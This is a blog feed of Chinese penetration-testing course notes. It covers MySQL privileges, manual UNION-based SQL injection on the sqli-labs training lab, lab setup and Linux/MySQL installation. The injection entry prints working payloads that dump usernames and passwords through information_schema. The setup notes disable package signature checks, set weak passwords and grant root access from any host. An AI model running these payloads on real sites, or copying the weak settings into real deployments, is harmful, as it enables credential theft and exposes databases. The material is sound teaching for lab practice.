系统权限表<br>User表：存放用户账户信息以及全局级别（所有数据库）权限，决定了来自哪些主机的哪些用户可以访问数据库实例，如果有全局权限则意味着对所有数据库都有此权限<br>Db表：存放数据库级别的权限，决定了来自哪些主机的哪些用户可以访问此数据库<br>Tables_priv表：存放表级别的权限，决定了来自哪些主机的哪些用户可以访问数据库的这个表<br>Columns_priv表：存放列级别的权限，决定了来自哪些主机的哪些用户可以访问数据库表的这个字段<br>Procs_priv表：存放存储过程和函数级别的权限</p><ol start="2"><li>MySQL 权限级别分为：<br>全局性的管理权限： 作用于整个MySQL实例级别<br>数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上<br>数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象</li></ol><p>3.查看mysql 有哪些用户：<br>mysql&gt; select user,host from mysql.user;</p><p>4.查看用户对应权限<br>select * from user where user=’root’ and host=’localhost’\G;  #所有权限都是Y ，就是什么权限都有</p><p>5.创建 mysql 用户<br>有两种方式创建MySQL授权用户</p><pre><code>执行create user/grant命令（推荐方式）CREATE USER 'finley'@'localhost' IDENTIFIED BY 'some_pass';通过insert语句直接操作MySQL系统权限表</code></pre><p>6.只提供id查询权限<br>grant select(id) on test.temp to test1@’localhost’ identified by ‘123456’;</p><p>7.把普通用户变成管理员<br>GRANT ALL PRIVILEGES ON <em>.</em> TO ‘test1‘@’localhost’ WITH GRANT OPTION;</p></code><p><code>8.删除用户<br>drop user finley@’localhost’; </code></p></pre><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2.2 SQL注入之MYSQL手工注入</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.2-sql-zhu-ru-zhi-mysql-shou-gong-zhu-ru/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.2-sql-zhu-ru-zhi-mysql-shou-gong-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之MYSQL手工注入</h1><p>本章节重点在于熟悉注入流程，以及注入原理。练习靶场为sqli-labs第二关数字型注入。</p><h3>sqli-labs数字型注入</h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921498000/a6c51cb8e8ec4a3b8840fa3c8e105f86.png" alt="image.png" class="align-none"></p><p>在url中输入id值，执行查询sql语句。即可得到对应数据</p><p>less-2源码分析：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921498000/d4245f8d3a7b423ebb96ddaa5f894fa8.png" alt="image.png" class="align-none"></p><p>浏览器 进行数据提交  服务器  ：</p><pre><code>get 提交  ：  url   数据长度      速度快       用于： </code><p><code>post 提交 ： 服务器    安全性   数据量 </code></p></pre><p></p><h3>注入流程</h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921498000/708c5f66672d462d8bffd38e68791f2f.png" alt="image.png" class="align-none"></p><h3>注入语句</h3><pre><code>尝试手工注入：        SQL注入：         1.判断有无注入点   and 1 = 1； true         随便输入内容  ==  报错  注入                      ==  没有注入        2.猜解列名数量 order by %20 空格        字段 4个<pre class="line-numbers language-none"><code class="language-none">3.报错，判断回显点 union 4.信息收集   数据库版本 version()  高版本：5.0  系统库： infromation 。。。  数据库名称：database（）  低版本：5.0 5.使用对应SQL进行注入  数据库库名：security. 下一级  infromation_schema.tables 查找表名table_name查询serurity库下面 所有的表名 database（）= 前后 连到一起union select 1,group_concat(table_name),3 from information_schema.tableswhere table_schema=database()表： users如何查询表里面有那些字段？ user 字符 转行 16进制union select 1,group_concat(column_name),3 from information_schema.columnswhere table_name=0x7573657273username  password  字段数据  select username,password from users0x3a  :union select 1,2,(select group_concat(username,0x3a,password)from users)  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code><p><code></code></p></pre><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2.1.SQL注入之sqli-labs环境搭建</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.1.sql-zhu-ru-zhi-sqli-labs-huan-jing-da-jian/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.1.sql-zhu-ru-zhi-sqli-labs-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之sqli-labs环境搭建</h1><p>往往很多新手在刚学习SQL注入的时候，都需要拥有一个能SQL注入的网站，需要有<strong>SQL注入点</strong> 的。直接去互联网上找的话对新手未免有点太难了，因此：我们一般都是在本地搭建一个能SQL注入测试的网站，那样我们学习SQL注入就容易多了。</p><p>Sqli-labs是一个印度程序员写的，用来学习<a href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&amp;spm=1001.2101.3001.7020" target="_blank">sql注入</a>的一个游戏教程。</p><p>Sqli-labs项目地址—Github获取：<a href="https://github.com/Audi-1/sqli-labs" target="_blank">https://github.com/Audi-1/sqli-labs</a>（在预习资料中有下载好的）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/f0e4cdc9139a41fca432bb51ed8e4d3d.png" alt="image.png" class="align-none"></p><h2>Sqli-labs环境安装</h2><h6>需要安装以下环境</h6><p>apache+mysql+php<br>如果可以的话，推荐在windows和linux下分别安装</p><h3>工具下载链接：</h3><p>链接：<a href="https://pan.baidu.com/s/19om5w_QIK8uGWjhe2_SnXA" target="_blank">https://pan.baidu.com/s/19om5w_QIK8uGWjhe2_SnXA</a><br>提取码：ianb</p><p><strong>安装之前确保本地没有下载mysql服务器！</strong></p><p>下载地址：<a href="https://www.xp.cn/" target="_blank">https://www.xp.cn/</a></p><p>在发放的预习资料里面有下载好的工具：</p><p>解压之后如下图，运行phpstudy_x64.exe:</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/776589a200c541c7ba73896dcc674f95.png" alt="image.png" class="align-none"></p><p>双击第一个运行程序后，出现安装界面，点击下方的“自定义安装”安装在除C盘外的盘符。之后点击立即安装即可。（一定要记住自己的安装目录 ！！！！！！）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/f24dfc2541824962a042c5e499e99202.png" alt="image.png" class="align-none"></p><p>点击安装之后，会出现安装进度条。等待不到1分钟，就会出现安装完成界面。点击安装完成，进入首页。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/9435aede1cbe44c1a9025247ee4a1be1.png" alt="image.png" class="align-none"></p><p>安装完成启动对应服务：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/2b7320469dcd490397a8b8c80f87a5d5.png" alt="image.png" class="align-none"></p><p><strong>需要注意的是：phpstudy自带的php版本过高，不兼容sqli-las靶场中php的版本，需要手动设置为低版本</strong></p><p>点击 软件管理 --&gt; php --&gt; 选择php5.2.17 点击安装 即可</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/ce6504666e5540b1b50f7caa432a0341.png" alt="image.png" class="align-none"></p><p>检查是否更换好：</p><p>点击 网站  --&gt; 管理 --&gt; php版本 --&gt;</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/53c08b3e6036439e82ae50e8e801355f.png" alt="image.png" class="align-none"></p><p>sqli-las下载解压完成后，把解压文件放入phpstudy安装路径下的www文件夹中</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/97f47440dafa4744a07e44ba4e3eda90.png" alt="image.png" class="align-none"></p><p>sqli-labs 正常访问需要连接数据库，设置连接数据库配置文件才能正常连接。</p><p>mysql配置文件在sqli-labs文件中sql-connections</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/a0cf0cd341aa4e10900bdf15a5d2aeef.png" alt="image.png" class="align-none"></p><p>进入sql-connections找到db-creds文件进行配置，phpstudy中默认账号和密码为 root</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/b124f42f95f247238d8fbfbaf20a3a07.png" alt="image.png" class="align-none"></p><p><strong>注意：要想phpstudy中自带mysql正常使用，需确保本地没有下载mysql服务器，如有需要卸载本地mysql服务，防止端口占用！</strong></p><h1>phpstudy连接mysql总是启动了又停止</h1><p>第一种情况可能是端口占用问题，可以选择在phpstudy的MySQL中点击 ‘配置’ 里面更改端口，改成3307即可，不过一般这种情况较少</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/6f223955c9c8430a8324b7681117079d.png" alt="image.png" class="align-none"></p><p>第二种情况就是曾经在电脑上安装过mysql，忘记了的可以在服务里面进行查看，比如：</p><p>如何查看 我的电脑--》右击--》管理--》服务和应用程序--》服务</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/8756981d09ad41a68681b10cef633ce0.png" alt="image.png" class="align-none"></p><p>这时候可以进入win + R输入cmd，最好以管理员的身份进入<br>之后输入 sc delete mysql，做完这一步在进入注册表，彻底删除之前的mysql</p><p>1、HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Application\MySQL 目录删除</p><p>2、 HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Eventlog\Application\MySQL 目录删除</p><p>3、HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\Application\MySQL 目录删除</p><p>做完这几步后恭喜你，离成功很近了，再次进入<a href="https://so.csdn.net/so/search?q=phpstudy&amp;spm=1001.2101.3001.7020" target="_blank">phpstudy</a>，在软件管理中删除之前的mysql服务，重新安装自己合适的选项，之后再去首页启动mysql服务就成功啦！</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/fc1e111299b743eb88f56dcf570e8b38.png" alt="image.png" class="align-none"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>1.3 SQL注入之MYSQL系统库</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.3-sql-zhu-ru-zhi-mysql-xi-tong-ku/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.3-sql-zhu-ru-zhi-mysql-xi-tong-ku/</url>
      
        <content type="html"><![CDATA[<h3>一.系统库释义</h3><p>提供了访问数据库元数据的方式</p><p>元数据是关于数据库的数据，如数据库名和表名，列的数据类型或访问权限。</p><p>![](file://C:/Users/ZQ/Desktop/SQL%E6%B3%A8%E5%85%A5/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%8A%82/images/f80f75d873150a6c54772108475cfc3.png?lastModify=1644921091)<img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921082000/df73281d42e04835b0f70ec0773ec8a8.png" alt="image.png" class="align-none"></p><p>1.<strong>information_schema 库</strong>：是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息；</p><p>例如数据库或表的名称，列的数据类型或访问权限。有时用于此信息的其他术语是数据字典和系统目录。web渗透过程中用途很大。</p><pre><code>SCHEMATA 表：提供了当前MySQL实例中所有数据库信息， show databases结果取之此表。<pre><code>TABLES表：提供了关于数据中表的信息。table_nameCOLUMNS表：提供了表的列信息，详细描述了某张表的所有列以及每个列的信息。column_name</code></pre></code><p><code></code></p></pre><p></p><p>![](file://C:/Users/ZQ/Desktop/SQL%E6%B3%A8%E5%85%A5/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%8A%82/images/bfae53d5e9624cc36174ec315746044.png?lastModify=1644921091)<img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921082000/f60d65e839dc412db97edf87fd572f47.png" alt="image.png" class="align-none"></p><p>2、<strong>performance_schema库</strong>具有87张表。<br>MySQL 5.5开始新增一个数据库：PERFORMANCE_SCHEMA，主要用于收集数据库服务器性能参数。内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级。</p><p>3、<strong>mysql库</strong>是核心数据库，类似于sql server中的master表，主要负责存储数据库的用户（账户）信息、权限设置、关键字等mysql自己需要使用的控制和管理信息。不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。<br>常用举例：在mysql.user表中修改root用户的密码</p><p>4、<strong>sys库</strong>具有1个表，100个视图。<br>sys库是MySQL 5.7增加的系统数据库，这个库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。<br>可以查询谁使用了最多的资源，哪张表访问最多等。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>1.2 SQL注入之MYSQL语句语法</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.2-sql-zhu-ru-zhi-mysql-yu-ju-yu-fa/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.2-sql-zhu-ru-zhi-mysql-yu-ju-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之数据库概述</h1><p>数据库就是一个存储数据的仓库，数据库是以一定方式存储在一起，能与多个用户共享，具有尽可能小的冗余，与应用程序彼此独立的数据集合。</p><h3>关系型数据库</h3><p>关系型数据库，存储的格式可以直观地反映实体间的关系，和常见的表格比较相似</p><p>关系型数据库中表与表之间有很多复杂的关联关系的</p><p>常见的关系型数据库有MySQL，Orcale，PostgreSQL , SQL Server等。</p><h3>非关系型数据库</h3><p>随着近些年技术方向的不断扩展，大量的NoSQL数据库如 Mon goDB，Redis出于简化数据库结构，避免冗余，影响性能的表连接。摒弃复杂分布式的目的被设计</p><p>NoSQL数据库适合追求速度和可扩展性，业务多变的场景</p><p><a href="https://db-engines.com/en/ranking" target="_blank">数据库排行：https://db-engines.com/en/ranking</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644920636000/061b29bf0a964fc09f9db997b127a63e.png" alt="image.png" class="align-none"></p><h3><strong>数据库服务器层级关系：</strong></h3><p>服务器里面<br>：多个数据库<br>：多个数据表<br>：多个行 列  字段<br>： 数据</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644920636000/4d27fc6e0941461193ba75ebcaafce1b.png" alt="image.png" class="align-none"></p><h3>SQL语句语法回顾：</h3><pre><code> 查询当前数据库服务器所有的数据库        show databases;        选中某个数据库        use 数据库名字 test        查询当前数据库所有的表        show tables；        查询t1表所有数据        查询关键 select         * 所有        from  表名        select * from t1;        条件查询 id=2        where 条件  编程 if（条件 true）{执行}<pre><code>    select * from t1 where id=2；    查询id=2   pass =111    union 合并查询     2个特性：    前面查询的语句 和 后面的查询语句 结果互不干扰！    前面的查询语句的字段数量 和 后面的查询语句字段数量  要一致    * == 3    select id from t1 where id=-1 union select * from t1 where pass =111;    order by 排序    order by 字段名字  id  也可以 跟上数字 1 2 3 4 .。。。。。    猜解表的列数 知道表有几列  </code></pre></code><p><code></code></p></pre><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>1.1什么是SQL注入</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.1-shi-me-shi-sql-zhu-ru/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.1-shi-me-shi-sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p><a name="kS2Rv"></a></p><h1 id="SQL-注入（Injection）-概述"><a href="#SQL-注入（Injection）-概述" class="headerlink" title="SQL 注入（Injection） 概述"></a>SQL 注入（Injection） 概述</h1><p><img src="../../../../assets/bfb7f935e7924e5ecb2615f5596d39ce/58c15b4123ff4377bf667232040551a4.png"><img src="file://C:/Users/ZQ/Desktop/SQL%E6%B3%A8%E5%85%A5/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%8A%82/images/1640755380996.png?lastModify=1644920493"><br>SQL注入即是指<a href="https://baike.baidu.com/item/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/2498090">web应用程序</a>对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的<a href="https://baike.baidu.com/item/SQL%E8%AF%AD%E5%8F%A5/5714895">SQL语句</a>，在管理员不知情的情况下实现非法操作，以此来实现欺骗<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8/613818">数据库服务器</a>执行非授权的任意查询，从而进一步得到相应的数据信息 <a name="PRVTG"></a></p><h3 id="web应用程序三层架构：视图层-业务逻辑层-数据访问层"><a href="#web应用程序三层架构：视图层-业务逻辑层-数据访问层" class="headerlink" title="web应用程序三层架构：视图层 + 业务逻辑层  + 数据访问层"></a>web应用程序三层架构：视图层 + 业务逻辑层  + 数据访问层</h3><p><img src="../../../../assets/bfb7f935e7924e5ecb2615f5596d39ce/ed5994b0523a48ea91a9dd7df3629ac2.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-9-Linux软件安装</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-9-ruan-jian-an-zhuang/ke-shi-1-9-linux-ruan-jian-an-zhuang/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-9-ruan-jian-an-zhuang/ke-shi-1-9-linux-ruan-jian-an-zhuang/</url>
      
        <content type="html"><![CDATA[<p><a name="ChzHU"></a></p><h2 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h2><ol><li>软件为什么需要安装</li><li>脚本和程序的区别</li><li>Linux安装软件的几种方式</li><li>CentOS安装软件案例</li><li>Linux软件版本管理 <a name="sTB8S"></a></li></ol><h1 id="Windows软件安装流程"><a href="#Windows软件安装流程" class="headerlink" title="Windows软件安装流程"></a>Windows软件安装流程</h1><ol><li>安装检查</li><li>释放文件</li><li>复制可执行文件</li><li>DLL动态链接库/安装服务</li><li>注册表</li><li>开始菜单和快捷方式 <a name="csbUM"></a></li></ol><h2 id="Windows安装文件"><a href="#Windows安装文件" class="headerlink" title="Windows安装文件"></a>Windows安装文件</h2><p>.msi<br>.exe <a name="ROeDQ"></a></p><h2 id="Windows可执行程序"><a href="#Windows可执行程序" class="headerlink" title="Windows可执行程序"></a>Windows可执行程序</h2><p>.exe</p><p><a name="XNzGp"></a></p><h1 id="Linux可执行程序"><a href="#Linux可执行程序" class="headerlink" title="Linux可执行程序"></a>Linux可执行程序</h1><p>/bin<br>/sbin<br>/usr/bin<br>/usr/sbin <a name="GwsH5"></a></p><h2 id="脚本和程序的区别"><a href="#脚本和程序的区别" class="headerlink" title="脚本和程序的区别"></a>脚本和程序的区别</h2><p>不需要编译的: Javascript、 Python、 Ruby.<br>需要编译的: C、C++、Swift、 Kotlin、 Go.</p><p>解释型:边解释边执行<br>编译型:计算机可以直接执行</p><p><a name="zJQgj"></a></p><h1 id="Linux软件常见安装方式"><a href="#Linux软件常见安装方式" class="headerlink" title="Linux软件常见安装方式"></a>Linux软件常见安装方式</h1><p>源码编译(make)、rpm、deb、yum、apt、Docker……</p><p><a name="v68Oc"></a></p><h2 id="Linux主要派系"><a href="#Linux主要派系" class="headerlink" title="Linux主要派系"></a>Linux主要派系</h2><table><thead><tr><th>主要派系</th><th>Linux发型版</th><th>主要安装方式</th></tr></thead><tbody><tr><td>Redhat红帽派系</td><td>Redhat、CentOS、 Fedora等</td><td>make、rpm、 yum、dnf</td></tr><tr><td>Debian派系</td><td>Kali、Ubuntu等</td><td>deb、apt、 dpkg</td></tr><tr><td>FreeBSD系</td><td>FreeBSD</td><td>make、pkg、 ports</td></tr></tbody></table><p><a name="qdlUB"></a></p><h3 id="Redhat系"><a href="#Redhat系" class="headerlink" title="Redhat系"></a>Redhat系</h3><p><a name="CzrmI"></a></p><h4 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h4><p>下载源代码安装包文件</p><ul><li>步骤1: tar包解压缩</li></ul><p>用途:解压并释放源代码包到指定的目录</p><ul><li>步骤2/configure配置</li></ul><p>用途:设置安装目录、安装模块等选项</p><ul><li>步骤3:make编译</li></ul><p>用途:生成可执行的二进制文件</p><ul><li>步骤4: make install</li></ul><p>用途:复制二进制文件到系统，配置环境</p><p>配置并使用软件 <a name="VGVOU"></a></p><h4 id="rpm安装"><a href="#rpm安装" class="headerlink" title="rpm安装"></a>rpm安装</h4><p>RedHat Package Manager 软件包管理工具 <a name="zFHfU"></a></p><h5 id="rpm选项"><a href="#rpm选项" class="headerlink" title="rpm选项"></a>rpm选项</h5><table><thead><tr><th>操作</th><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>查询</td><td>rpm -qa</td><td></td></tr><tr><td>rpm -q 包名</td><td>q: query</td><td></td></tr><tr><td>安装</td><td>rpm -ivh 包名</td><td>i: install 安装</td></tr><tr><td>v: verbose 详细</td><td></td><td></td></tr><tr><td>h: hash 哈希</td><td></td><td></td></tr><tr><td>升级</td><td>rpm -Uvh 包名</td><td>U:安装或升级最新版</td></tr><tr><td>卸载</td><td>rpm -e 包名</td><td>需要先卸载依赖其的软件</td></tr></tbody></table><p><a name="z8SWP"></a></p><h4 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a>yum安装</h4><p>YUM (Yellow dog Updater, Modified)</p><p><a name="JsgZk"></a></p><h5 id="yum操作和选项"><a href="#yum操作和选项" class="headerlink" title="yum操作和选项"></a>yum操作和选项</h5><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>列表</td><td>yum list</td></tr><tr><td>yum list 包名</td><td></td></tr><tr><td>搜索</td><td>yum search 包名</td></tr><tr><td>安装</td><td>yum install 包名</td></tr><tr><td>升级</td><td>yum update 包名</td></tr><tr><td>卸载</td><td>yum remove 包名</td></tr><tr><td>更新所有软件</td><td>yum update</td></tr><tr><td>清除缓存</td><td>yum clean all</td></tr><tr><td>更新yum缓存</td><td>yum make cache</td></tr></tbody></table><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>-h</td><td>显示帮助信息</td></tr><tr><td>-y</td><td>对所有的提问都回答”yes”</td></tr><tr><td>-c</td><td>指定配置文件</td></tr><tr><td>-q</td><td>安静模式</td></tr><tr><td>-v</td><td>详细模式</td></tr></tbody></table><p><a name="ao8sV"></a></p><h5 id="DNF和YUM的区别"><a href="#DNF和YUM的区别" class="headerlink" title="DNF和YUM的区别"></a>DNF和YUM的区别</h5><p>DNF (Dandified YUM)</p><table><thead><tr><th>区别</th><th>DNF</th><th>YUM</th></tr></thead><tbody><tr><td>解析依赖关系</td><td>使用Libsolv</td><td>使用公开的API</td></tr><tr><td>API</td><td>有完整的API文档，能很容易地创建新功能</td><td>没有完整文档，创建新功能困难</td></tr><tr><td>开发语言</td><td>C、C++、Python编写</td><td>只用Ptyhon编写</td></tr><tr><td>使用范围</td><td>Fedora、RHEL 8、CentOS8、OEL 8、Mageia 6/7</td><td>RHEL 6/7、CentOS 6/7、OEL 6/7</td></tr><tr><td>扩展的支持</td><td>支持各种扩展</td><td>只支持基于Python的扩展</td></tr><tr><td>同步元数据</td><td>占用内存少</td><td>占用较多内存</td></tr><tr><td>更新</td><td>包中包含不相关的依赖，则不会更新</td><td>在没有验证的情况下更新软件包</td></tr><tr><td>存储库不可用</td><td>DNF将跳过它，并继续使用可用的存储库处理事务</td><td>YUM会立即停止</td></tr><tr><td>内核包的保护</td><td>DNF不提供，可以删除内核包</td><td>不允许你删除运行中的内核</td></tr></tbody></table><p><a name="bPNfV"></a></p><h3 id="Debian系"><a href="#Debian系" class="headerlink" title="Debian系"></a>Debian系</h3><p>Deb包安装<br>apt安装</p><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>搜索</td><td>apt search 包名</td></tr><tr><td>安装</td><td>apt install 包名</td></tr><tr><td>升级</td><td>apt update 包名</td></tr><tr><td>卸载</td><td>apt remove 包名</td></tr></tbody></table><p><a name="DKDQ1"></a></p><h3 id="FreeBSD系"><a href="#FreeBSD系" class="headerlink" title="FreeBSD系"></a>FreeBSD系</h3><p>package<br>ports</p><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>搜索</td><td>pkg search 包名</td></tr><tr><td>安装</td><td>pkg install 包名</td></tr><tr><td>升级</td><td>pkg upgrade 包名</td></tr><tr><td>卸载</td><td>pkg del 包名</td></tr></tbody></table><p><a name="UBaPW"></a></p><h1 id="Linux软件安装方式案例"><a href="#Linux软件安装方式案例" class="headerlink" title="Linux软件安装方式案例"></a>Linux软件安装方式案例</h1><p><a name="YfyzB"></a></p><h2 id="CentOS启用中文输入法"><a href="#CentOS启用中文输入法" class="headerlink" title="CentOS启用中文输入法:"></a>CentOS启用中文输入法:</h2><p><a href="https://blog.csdn.net/qq_30273575/article/details/125097771">https://blog.csdn.net/qq_30273575/article/details/125097771</a> <a name="ehWZc"></a></p><h2 id="CentOS-yum安装MySQL"><a href="#CentOS-yum安装MySQL" class="headerlink" title="CentOS yum安装MySQL:"></a>CentOS yum安装MySQL:</h2><p><a href="https://blog.csdn.net/weixin_44436964/article/details/123845958">https://blog.csdn.net/weixin_44436964/article/details/123845958</a> <a name="Aup3A"></a></p><h3 id="一、卸载MYSQL"><a href="#一、卸载MYSQL" class="headerlink" title="一、卸载MYSQL"></a>一、卸载MYSQL</h3><p><a name="cQsmE"></a></p><h4 id="1-先确认创建的CentOS中是否含有其他软件包"><a href="#1-先确认创建的CentOS中是否含有其他软件包" class="headerlink" title="1.先确认创建的CentOS中是否含有其他软件包"></a>1.先确认创建的CentOS中是否含有其他软件包</h4><pre><code>rpm -qa | grep mysql 查mysql相关软件包rpm -e xxx  卸载查询的软件包</code></pre><p>问题：出现已另存的警告时，将另存的单独删除，删除语法：&amp;#x20;<br><code>rm-f /etc/my.cnf.rpmsave</code> <a name="FC0hi"></a></p><h4 id="2-删除相关的文件和目录"><a href="#2-删除相关的文件和目录" class="headerlink" title="2.删除相关的文件和目录"></a>2.删除相关的文件和目录</h4><pre><code>find / -name mysql 查询文件或目录 rm -rf xxx 删除相关文件或目录 </code></pre><p><a name="mDAPs"></a></p><h4 id="3-清楚rpm缓存"><a href="#3-清楚rpm缓存" class="headerlink" title="3.清楚rpm缓存"></a>3.清楚rpm缓存</h4><pre><code>yum clean all  清理本地缓存</code></pre><p><a name="EKPR5"></a></p><h3 id="二、mysql部署"><a href="#二、mysql部署" class="headerlink" title="二、mysql部署"></a>二、mysql部署</h3><p><a name="GXM3J"></a></p><h4 id="1-mysql安装"><a href="#1-mysql安装" class="headerlink" title="1. mysql安装"></a>1. mysql安装</h4><pre><code>1.下载mysql安装源文件wget 'https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm'2.安装mysql的yum源文件rpm -Uvh mysql57-community-release-el7-11.noarch.rpm3.安装mysqlyum -y install mysql-community-server4.启动mysql服务systemctl start mysqld5.添加MySQL服务到开机启动systemctl enable mysqld</code></pre><p>问题：安装第三步时报错密钥不匹配<br>解决：打开<code>/etc/yum.repos.d/mysql-community.repo</code>,更改对应版本的<code>gpgcheck=0</code> <a name="AjHCi"></a></p><h4 id="2-修改mysql默认的密码"><a href="#2-修改mysql默认的密码" class="headerlink" title="2.修改mysql默认的密码"></a>2.修改mysql默认的密码</h4><pre><code>1. 查看源码安装的MySQL的密码grep 'temporary password' /var/log/mysqld.log2. 在Linux下登录mysql服务器mysql -uroot -p上一步的临时密码,有特殊字符时需采用复制粘贴的方式3. 设置mysql数据密码策略set global validate_password_policy=0;set global validate_password_length=1;4. 修改数据库密码set password for root@localhost = password('123456');</code></pre><p><a name="EBUvI"></a></p><h4 id="3-修改mysql远程连接的权限"><a href="#3-修改mysql远程连接的权限" class="headerlink" title="3.修改mysql远程连接的权限"></a>3.修改mysql远程连接的权限</h4><pre><code>1. 切换到mysql库use mysql;2. 查看主机及用户信息select host,user from user;3. 赋予任何主机访问数据的权限grant all privileges on *.* to 'root'@'%' identified by 'AbCd@123456' with grant option;4. 刷新权限使其生效flush 